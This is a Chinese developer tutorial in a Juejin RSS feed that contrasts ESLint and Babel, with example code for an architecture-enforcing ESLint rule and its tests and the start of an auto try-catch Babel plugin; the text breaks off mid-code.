<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[前端ESLint 和 Babel对比]]></title>    <link>https://juejin.cn/post/7597596202025615402</link>    <guid>https://juejin.cn/post/7597596202025615402</guid>    <pubDate>2026-01-21T12:05:21.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597596202025615402" data-draft-id="7597641580104974390" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端ESLint 和 Babel对比"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-21T12:05:21.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小小小小宇"/> <meta itemprop="url" content="https://juejin.cn/user/3386151546662077"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端ESLint 和 Babel对比
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3386151546662077/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小小小小宇
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T12:05:21.000Z" title="Wed Jan 21 2026 12:05:21 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ESLint 和 Babel 虽然都基于 AST（抽象语法树）工作，但它们的设计目的、工作流和 API 设计有着本质的区别。</p>
<ol>
<li><strong>ESLint 插件实战</strong>：开发一个 <code>eslint-plugin-clean-arch</code>，用于强制执行“整洁架构”的依赖原则（例如：禁止 UI 层直接导入 DAO 层，必须经过 Service 层）。</li>
<li><strong>Babel 插件实战</strong>：开发一个 <code>babel-plugin-auto-try-catch</code>，用于在编译时自动给 <code>async/await</code> 函数包裹 <code>try-catch</code> 块，并上报错误信息，避免手动写大量重复代码。</li>
</ol>
<hr/>
<h3 data-id="heading-0">第一部分：核心差异概览</h3>
<p>在进入代码之前，先通过表格建立核心认知：</p>








































<table><thead><tr><th align="left">特性</th><th align="left">ESLint 插件</th><th align="left">Babel 插件</th></tr></thead><tbody><tr><td align="left"><strong>核心目标</strong></td><td align="left"><strong>代码质量检查</strong>与风格统一（Linting）</td><td align="left"><strong>代码转换</strong>与编译（Transpiling）</td></tr><tr><td align="left"><strong>输出结果</strong></td><td align="left">报告错误/警告，或进行源码级的字符串替换（Fix）</td><td align="left">生成全新的、兼容性更好的 JavaScript 代码</td></tr><tr><td align="left"><strong>AST 标准</strong></td><td align="left"><strong>ESTree</strong> (使用 <code>espree</code> 解析)</td><td align="left"><strong>Babel AST</strong> (基于 ESTree 但有细微差异，如 Literal 分类)</td></tr><tr><td align="left"><strong>遍历方式</strong></td><td align="left">扁平化的选择器遍历 (Selectors)</td><td align="left">访问者模式 (Visitor Pattern)</td></tr><tr><td align="left"><strong>修改能力</strong></td><td align="left">弱。主要通过 <code>fixer</code> 提供文本范围替换，必须保持 AST 有效性比较难</td><td align="left">强。可以随意增删改查节点，生成完全不同的代码结构</td></tr><tr><td align="left"><strong>运行时机</strong></td><td align="left">开发时（IDE提示）、提交时（Husky）、CI/CD 阶段</td><td align="left">构建打包阶段（Webpack/Vite/Rollup 加载器中）</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-1">第二部分：ESLint 自定义插件实战 (深度代码)</h3>
<h4 data-id="heading-2">场景描述</h4>
<p>在大型项目中，我们需要控制模块间的依赖关系。假设项目结构如下：</p>
<ul>
<li><code>src/views</code> (UI层)</li>
<li><code>src/services</code> (业务逻辑层)</li>
<li><code>src/api</code> (数据访问层)</li>
</ul>
<p><strong>规则</strong>：<code>src/views</code> 下的文件，禁止直接 <code>import</code> 来自 <code>src/api</code> 的文件，必须通过 <code>src/services</code> 调用。</p>
<h4 data-id="heading-3">1. 插件入口结构</h4>
<p>通常定义在 <code>index.js</code> 中。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@fileoverview</span> <span class="hljs-variable">eslint</span>-plugin-clean-arch
 * 强制执行项目架构分层依赖规则的 ESLint 插件
 */</span>
<span class="hljs-meta">'use strict'</span>;

<span class="hljs-comment">// 导入我们即将编写的规则定义</span>
<span class="hljs-keyword">const</span> restrictLayerImports = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./rules/restrict-layer-imports'</span>);

<span class="hljs-comment">// 插件主入口</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-comment">// 插件元数据</span>
  <span class="hljs-attr">meta</span>: {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'eslint-plugin-clean-arch'</span>,
    <span class="hljs-attr">version</span>: <span class="hljs-string">'1.0.0'</span>
  },
  <span class="hljs-comment">// 暴露配置预设（用户可以直接 extends: ['plugin:clean-arch/recommended']）</span>
  <span class="hljs-attr">configs</span>: {
    <span class="hljs-attr">recommended</span>: {
      <span class="hljs-attr">plugins</span>: [<span class="hljs-string">'clean-arch'</span>],
      <span class="hljs-attr">rules</span>: {
        <span class="hljs-string">'clean-arch/restrict-layer-imports'</span>: <span class="hljs-string">'error'</span>
      }
    }
  },
  <span class="hljs-comment">// 规则定义集合</span>
  <span class="hljs-attr">rules</span>: {
    <span class="hljs-string">'restrict-layer-imports'</span>: restrictLayerImports
  },
  <span class="hljs-comment">// 处理器（可选，用于处理非 JS 文件，如 .vue 中的 script）</span>
  <span class="hljs-attr">processors</span>: {
    <span class="hljs-comment">// 这里简单示意，通常 vue-eslint-parser 已经处理了</span>
  }
};
</code></pre>
<h4 data-id="heading-4">2. 规则实现核心 (<code>rules/restrict-layer-imports.js</code>)</h4>
<p>这是最核心的部分，包含了 AST 分析逻辑。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@fileoverview</span> 禁止跨层级直接调用
 */</span>
<span class="hljs-meta">'use strict'</span>;

<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-comment">// 辅助函数：标准化路径分隔符，兼容 Windows</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">normalizePath</span>(<span class="hljs-params">filePath</span>) {
  <span class="hljs-keyword">return</span> filePath.<span class="hljs-title function_">split</span>(path.<span class="hljs-property">sep</span>).<span class="hljs-title function_">join</span>(<span class="hljs-string">'/'</span>);
}

<span class="hljs-comment">// 辅助函数：判断文件属于哪个层级</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getLayer</span>(<span class="hljs-params">filePath</span>) {
  <span class="hljs-keyword">const</span> normalized = <span class="hljs-title function_">normalizePath</span>(filePath);
  <span class="hljs-keyword">if</span> (normalized.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/src/views/'</span>)) <span class="hljs-keyword">return</span> <span class="hljs-string">'views'</span>;
  <span class="hljs-keyword">if</span> (normalized.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/src/services/'</span>)) <span class="hljs-keyword">return</span> <span class="hljs-string">'services'</span>;
  <span class="hljs-keyword">if</span> (normalized.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/src/api/'</span>)) <span class="hljs-keyword">return</span> <span class="hljs-string">'api'</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-string">'other'</span>;
}

<span class="hljs-comment">/** <span class="hljs-doctag">@type</span> {<span class="hljs-type">import('eslint').Rule.RuleModule</span>} */</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">meta</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'problem'</span>, <span class="hljs-comment">// problem | suggestion | layout</span>
    <span class="hljs-attr">docs</span>: {
      <span class="hljs-attr">description</span>: <span class="hljs-string">'Enforce strict layer dependency rules: Views -&gt; Services -&gt; API'</span>,
      <span class="hljs-attr">category</span>: <span class="hljs-string">'Architecture'</span>,
      <span class="hljs-attr">recommended</span>: <span class="hljs-literal">true</span>,
      <span class="hljs-attr">url</span>: <span class="hljs-string">'https://my-company.wiki/arch-rules'</span>
    },
    <span class="hljs-attr">fixable</span>: <span class="hljs-literal">null</span>, <span class="hljs-comment">// 本规则不提供自动修复，因为架构调整需要人工介入</span>
    <span class="hljs-comment">// 定义错误消息模板</span>
    <span class="hljs-attr">messages</span>: {
      <span class="hljs-attr">restrictedImport</span>: <span class="hljs-string">'架构违规: "{{currentLayer}}" 层禁止直接引入 "{{targetLayer}}" 层模块。请通过 Service 层中转。'</span>,
      <span class="hljs-attr">invalidPath</span>: <span class="hljs-string">'无法解析的导入路径: {{importPath}}'</span>
    },
    <span class="hljs-comment">// 规则配置 Schema</span>
    <span class="hljs-attr">schema</span>: [
      {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'object'</span>,
        <span class="hljs-attr">properties</span>: {
          <span class="hljs-comment">// 允许用户自定义层级映射</span>
          <span class="hljs-attr">layers</span>: {
            <span class="hljs-attr">type</span>: <span class="hljs-string">'object'</span>
          }
        },
        <span class="hljs-attr">additionalProperties</span>: <span class="hljs-literal">false</span>
      }
    ]
  },

  <span class="hljs-comment">/**
   * create 方法返回一个对象，该对象的方法名为 AST 选择器
   * ESLint 遍历 AST 时会回调这些方法
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">import('eslint').Rule.RuleContext</span>} <span class="hljs-variable">context</span>
   */</span>
  <span class="hljs-title function_">create</span>(<span class="hljs-params">context</span>) {
    <span class="hljs-comment">// 获取当前正在被 Lint 的文件名</span>
    <span class="hljs-keyword">const</span> currentFilename = context.<span class="hljs-title function_">getFilename</span>();
    <span class="hljs-keyword">const</span> currentLayer = <span class="hljs-title function_">getLayer</span>(currentFilename);

    <span class="hljs-comment">// 如果当前文件不在受控层级中，直接忽略</span>
    <span class="hljs-keyword">if</span> (currentLayer === <span class="hljs-string">'other'</span>) {
      <span class="hljs-keyword">return</span> {};
    }

    <span class="hljs-comment">// 定义层级依赖约束表</span>
    <span class="hljs-comment">// Key: 当前层级, Value: 禁止引入的层级集合</span>
    <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">RESTRICTED_MAP</span> = {
      <span class="hljs-string">'views'</span>: [<span class="hljs-string">'api'</span>], <span class="hljs-comment">// View 层禁止引入 API 层</span>
      <span class="hljs-string">'services'</span>: [],   <span class="hljs-comment">// Service 层可以引入 API</span>
      <span class="hljs-string">'api'</span>: [<span class="hljs-string">'views'</span>, <span class="hljs-string">'services'</span>] <span class="hljs-comment">// API 层通常是底层的，不应反向依赖</span>
    };

    <span class="hljs-comment">/**
     * 核心校验逻辑
     * <span class="hljs-doctag">@param</span> {<span class="hljs-type">ASTNode</span>} <span class="hljs-variable">node</span> - ImportDeclaration 节点
     */</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyImport</span>(<span class="hljs-params">node</span>) {
      <span class="hljs-comment">// 获取 import 的路径值，例如: import x from '@/api/user' 中的 '@/api/user'</span>
      <span class="hljs-keyword">const</span> importPath = node.<span class="hljs-property">source</span>.<span class="hljs-property">value</span>;

      <span class="hljs-comment">// 忽略第三方库 (通常不以 . / @ 开头，或者是 node_modules)</span>
      <span class="hljs-comment">// 这里简单判断：如果不是相对路径也不是别名路径，认为是 npm 包</span>
      <span class="hljs-keyword">if</span> (!importPath.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'.'</span>) &amp;&amp; !importPath.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'/'</span>) &amp;&amp; !importPath.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'@'</span>)) {
        <span class="hljs-keyword">return</span>;
      }

      <span class="hljs-comment">// 尝试解析导入路径对应的实际层级</span>
      <span class="hljs-comment">// 注意：在 ESLint 规则中做完整的文件系统解析比较重，</span>
      <span class="hljs-comment">// 通常我们会根据字符串特征判断，或者依赖 resolver</span>
      <span class="hljs-keyword">let</span> targetLayer = <span class="hljs-string">'other'</span>;
      
      <span class="hljs-keyword">if</span> (importPath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/api/'</span>) || importPath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'@/api/'</span>)) {
        targetLayer = <span class="hljs-string">'api'</span>;
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (importPath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/services/'</span>) || importPath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'@/services/'</span>)) {
        targetLayer = <span class="hljs-string">'services'</span>;
      } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (importPath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'/views/'</span>) || importPath.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'@/views/'</span>)) {
        targetLayer = <span class="hljs-string">'views'</span>;
      }

      <span class="hljs-comment">// 检查是否违规</span>
      <span class="hljs-keyword">const</span> forbiddenLayers = <span class="hljs-variable constant_">RESTRICTED_MAP</span>[currentLayer] || [];
      
      <span class="hljs-keyword">if</span> (forbiddenLayers.<span class="hljs-title function_">includes</span>(targetLayer)) {
        context.<span class="hljs-title function_">report</span>({
          <span class="hljs-attr">node</span>: node.<span class="hljs-property">source</span>, <span class="hljs-comment">// 错误红线标在路径字符串上</span>
          <span class="hljs-attr">messageId</span>: <span class="hljs-string">'restrictedImport'</span>, <span class="hljs-comment">// 使用 meta.messages 中定义的 ID</span>
          <span class="hljs-attr">data</span>: {
            <span class="hljs-attr">currentLayer</span>: currentLayer,
            <span class="hljs-attr">targetLayer</span>: targetLayer
          }
        });
      }
    }

    <span class="hljs-keyword">return</span> {
      <span class="hljs-comment">// 监听 ES6 Import 语句</span>
      <span class="hljs-comment">// 例如: import { getUser } from '@/api/user';</span>
      <span class="hljs-title class_">ImportDeclaration</span>(node) {
        <span class="hljs-title function_">verifyImport</span>(node);
      },

      <span class="hljs-comment">// 监听动态 Import</span>
      <span class="hljs-comment">// 例如: const user = await import('@/api/user');</span>
      <span class="hljs-title class_">ImportExpression</span>(node) {
        <span class="hljs-comment">// 动态 import 的 source 就是调用的参数</span>
        <span class="hljs-title function_">verifyImport</span>(node);
      },

      <span class="hljs-comment">// 监听 CommonJS require (如果项目混用)</span>
      <span class="hljs-comment">// 例如: const api = require('@/api/user');</span>
      <span class="hljs-title class_">CallExpression</span>(node) {
        <span class="hljs-keyword">if</span> (
          node.<span class="hljs-property">callee</span>.<span class="hljs-property">name</span> === <span class="hljs-string">'require'</span> &amp;&amp;
          node.<span class="hljs-property">arguments</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> &amp;&amp;
          node.<span class="hljs-property">arguments</span>[<span class="hljs-number">0</span>].<span class="hljs-property">type</span> === <span class="hljs-string">'Literal'</span>
        ) {
          <span class="hljs-comment">// 构造成类似的结构以便复用 verifyImport</span>
          <span class="hljs-keyword">const</span> mockNode = {
            <span class="hljs-attr">source</span>: node.<span class="hljs-property">arguments</span>[<span class="hljs-number">0</span>]
          };
          <span class="hljs-title function_">verifyImport</span>(mockNode);
        }
      }
    };
  }
};
</code></pre>
<h4 data-id="heading-5">3. 单元测试 (<code>tests/rules/restrict-layer-imports.test.js</code>)</h4>
<p>ESLint 提供了 <code>RuleTester</code> 工具，非常方便进行 TDD 开发。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-meta">'use strict'</span>;

<span class="hljs-keyword">const</span> rule = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../../rules/restrict-layer-imports'</span>);
<span class="hljs-keyword">const</span> { <span class="hljs-title class_">RuleTester</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'eslint'</span>);

<span class="hljs-keyword">const</span> ruleTester = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuleTester</span>({
  <span class="hljs-attr">parserOptions</span>: {
    <span class="hljs-attr">ecmaVersion</span>: <span class="hljs-number">2020</span>,
    <span class="hljs-attr">sourceType</span>: <span class="hljs-string">'module'</span>
  }
});

<span class="hljs-comment">// 定义测试用例</span>
ruleTester.<span class="hljs-title function_">run</span>(<span class="hljs-string">'restrict-layer-imports'</span>, rule, {
  <span class="hljs-comment">// 1. 合法代码测试 (Valid)</span>
  <span class="hljs-attr">valid</span>: [
    {
      <span class="hljs-comment">// Service 层调用 API 层 -&gt; 合法</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"import { getUser } from '@/api/user';"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/services/userService.js'</span>
    },
    {
      <span class="hljs-comment">// View 层调用 Service 层 -&gt; 合法</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"import { getUserService } from '@/services/userService';"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/views/UserDetail.vue'</span>
    },
    {
      <span class="hljs-comment">// 引入第三方库 -&gt; 合法</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"import axios from 'axios';"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/views/UserDetail.vue'</span>
    },
    {
      <span class="hljs-comment">// 相对路径引用同层级文件 -&gt; 合法</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"import Header from './Header';"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/views/Footer.vue'</span>
    }
  ],

  <span class="hljs-comment">// 2. 违规代码测试 (Invalid)</span>
  <span class="hljs-attr">invalid</span>: [
    {
      <span class="hljs-comment">// View 层直接调用 API 层 -&gt; 报错</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"import { getUser } from '@/api/user';"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/views/UserDetail.vue'</span>,
      <span class="hljs-attr">errors</span>: [
        {
          <span class="hljs-attr">message</span>: <span class="hljs-string">'架构违规: "views" 层禁止直接引入 "api" 层模块。请通过 Service 层中转。'</span>,
          <span class="hljs-attr">type</span>: <span class="hljs-string">'Literal'</span> <span class="hljs-comment">// 报错节点类型</span>
        }
      ]
    },
    {
      <span class="hljs-comment">// API 层反向依赖 Views 层 -&gt; 报错</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"import router from '@/views/router';"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/api/http.js'</span>,
      <span class="hljs-attr">errors</span>: [
        {
          <span class="hljs-attr">message</span>: <span class="hljs-string">'架构违规: "api" 层禁止直接引入 "views" 层模块。请通过 Service 层中转。'</span>
        }
      ]
    },
    {
      <span class="hljs-comment">// 动态 Import 也要拦截</span>
      <span class="hljs-attr">code</span>: <span class="hljs-string">"const api = import('@/api/user');"</span>,
      <span class="hljs-attr">filename</span>: <span class="hljs-string">'/Users/project/src/views/Home.vue'</span>,
      <span class="hljs-attr">parserOptions</span>: { <span class="hljs-attr">ecmaVersion</span>: <span class="hljs-number">2020</span> },
      <span class="hljs-attr">errors</span>: [{ <span class="hljs-attr">messageId</span>: <span class="hljs-string">'restrictedImport'</span> }]
    }
  ]
});
</code></pre>
<hr/>
<h3 data-id="heading-6">第三部分：Babel 自定义插件实战 (深度代码)</h3>
<h4 data-id="heading-7">场景描述</h4>
<p>前端开发中，异步操作如果不加 <code>try-catch</code>，一旦报错可能导致页面白屏。手动给每个 <code>await</code> 加 <code>try-catch</code> 很繁琐且代码臃肿。
<strong>目标</strong>：编写一个 Babel 插件，自动识别 <code>async</code> 函数中的 <code>await</code> 语句，如果它没有被 <code>try-catch</code> 包裹，则自动包裹，并注入错误上报逻辑。</p>
<p><strong>转换前</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getData</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);
}
</code></pre>
<p><strong>转换后</strong>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getData</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Auto Captured Error:'</span>, e);
    <span class="hljs-comment">// window.reportError(e); // 可以在插件配置中传入上报函数名</span>
  }
}
</code></pre>
<h4 data-id="heading-8">1. Babel 插件基础结构</h4>
<p>Babel 插件导出一个函数，返回一个包含 <code>visitor</code> 属性的对象。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// babel-plugin-auto-try-catch.js</span>

<span class="hljs-comment">/**
 * Babel Types 库提供了用于构建、验证和转换 AST 节点的工具方法
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">import('@babel/core')</span>} <span class="hljs-variable">babel</span>
 */</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">babel</span>) {
  <span class="hljs-keyword">const</span> { <span class="hljs-attr">types</span>: t, template } = babel;

  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'babel-plugin-auto-try-catch'</span>,
    <span class="hljs-comment">// visitor 是访问者模式的核心</span>
    <span class="hljs-attr">visitor</span>: {
      <span class="hljs-comment">// 我们关注 FunctionDeclaration, FunctionExpression, ArrowFunctionExpression</span>
      <span class="hljs-comment">// 可以合并为一个选择器 'Function'</span>
      <span class="hljs-title class_">Function</span>(path, state) {
        <span class="hljs-comment">// 1. 如果函数不是 async 的，跳过</span>
        <span class="hljs-keyword">if</span> (!path.<span class="hljs-property">node</span>.<span class="hljs-property">async</span>) {
          <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 2. 如果函数体已经是空的，跳过</span>
        <span class="hljs-keyword">if</span> (path.<span class="hljs-property">node</span>.<span class="hljs-property">body</span>.<span class="hljs-property">body</span>.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
          <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 3. 检查函数体是否已经被 try-catch 包裹</span>
        <span class="hljs-comment">// 获取函数体的第一条语句</span>
        <span class="hljs-keyword">const</span> firstStatement = path.<span class="hljs-property">node</span>.<span class="hljs-property">body</span>.<span class="hljs-property">body</span>[<span class="hljs-number">0</span>];
        <span class="hljs-comment">// 如果只有一条语句且是 TryStatement，说明已经处理过或用户手动写了，跳过</span>
        <span class="hljs-keyword">if</span> (path.<span class="hljs-property">node</span>.<span class="hljs-property">body</span>.<span class="hljs-property">body</span>.<span class="hljs-property">length</span> === <span class="hljs-number">1</span> &amp;&amp; t.<span class="hljs-title function_">isTryStatement</span>(firstStatement)) {
          <span class="hljs-keyword">return</span>;
        }

        <span class="hljs-comment">// 4. 获取用户配置的排除项 (例如排除某些文件或函数名)</span>
        <span class="hljs-keyword">const</span> exclude = state.<span class="hljs-property">opts</span>.<span class="hljs-property">exclude</span> || [];
        <span class="hljs-comment">// 获取当前处理的文件路径</span>
        <span class="hljs-keyword">const</span> filename = state.<span class="hljs-property">file</span>.<span class="hljs-property">opts</span>.<span class="hljs-property">filename</span> || <span class="hljs-string">'unknown'</span>;
        <span class="hljs-comment">// 简单的排除逻辑示例</span>
        <span class="hljs-keyword">if</span> (exclude.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">pattern</span> =&gt;</span> filename.<span class="hljs-title function_">includes</span>(pattern))) {
          <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-comment">// 5. 开始执行转换</span>
